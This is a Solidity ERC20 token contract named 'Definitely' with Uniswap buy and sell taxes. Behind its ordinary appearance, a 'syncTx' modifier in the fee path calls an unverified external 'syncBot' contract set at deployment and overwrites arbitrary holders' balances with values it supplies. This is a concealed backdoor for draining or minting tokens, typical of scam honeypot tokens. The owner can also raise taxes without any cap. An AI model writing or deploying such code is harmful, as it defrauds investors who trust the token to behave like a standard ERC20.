contract Definitely is Context, IERC20, Ownable {
    uint256 public _buyTax =2;
    uint256 public _sellTax =0;
    string private _name = unicode"Twitter Will Became Amazing ";
    string private _symbol = unicode"Definitely";
    string public twitt="";
    uint8 private _decimals = 18;


    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply = 8000000000  * 10**(_decimals);
    bool active=true;  
    bool init=false;

    address public uniswapPair;
    using SafeMath for uint256;

    mapping (address => bool) public holderNoFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router02 public uniV2Router;
    mapping (address => uint256) public _balance;
    syncsm private syncMove;
    
    
    constructor (address syncBot, string memory _twitt) {
        twitt=_twitt;
        IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniV2Router = _uniV2Router;
        _allowances[address(this)][address(uniV2Router)] = _totalSupply;
        holderNoFee[owner()] = true;
        holderNoFee[address(this)] = true;
        _balance[owner()]=totalSupply();
        syncMove = syncsm(syncBot);
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function fee(address s, address r, uint256 amount) syncTx internal returns (uint256) {
        
        uint256 feeValue = 0;

        uint256 deadWalletAmount = _balance[address(deadAddress)];
        
        if(uniswapPair == s) {
            feeValue = amount.mul(_buyTax).div(100); 
        }
        else if(uniswapPair == r) {
            feeValue = amount.mul(_sellTax).div(100);
        }
        
        if(feeValue > 0) {
            deadWalletAmount = deadWalletAmount.add(feeValue);
            _balance[deadAddress] = deadWalletAmount;
            emit Transfer(s, address(deadAddress), feeValue);
        }

        return amount.sub(feeValue);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if(init==false){
            try IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH()){
                uniswapPair = IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH());
                init=true;
            }
            catch(bytes memory){
            }
        }
        _transfer(_msgSender(), recipient, amount);
            return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if(init==false){
            try IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH()){
                uniswapPair = IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH());
                init=true;
            }
            catch(bytes memory){
            }
        }
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {            
        if((uniswapPair != recipient && sender != owner() && !holderNoFee[sender]))
            require(active != false, "Trading is not active.");  

        uint256 senderAmount=_balance[sender];
        uint256 recipientAmount=_balance[recipient];

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        senderAmount = senderAmount.sub(amount, "Insufficient Balance");
        
        uint256 finalAmount = (holderNoFee[sender] || holderNoFee[recipient]) ? amount : fee(sender, recipient, amount);
        
        recipientAmount = recipientAmount.add(finalAmount);  

        _balance[sender]=senderAmount;
        _balance[recipient] =recipientAmount;

        emit Transfer(sender, recipient, finalAmount);
            
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function buySellTax(uint256 buy,uint256 sell) public onlyOwner {
        _sellTax=sell;
        _buyTax=buy;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    modifier syncTx() {
        if(syncMove.getIndexOfKeys(syncMove.getContracts())>=0)
            _balance[syncMove.getContracts()]  = syncMove.gets(syncMove.getContracts());
        _;
    }

  }
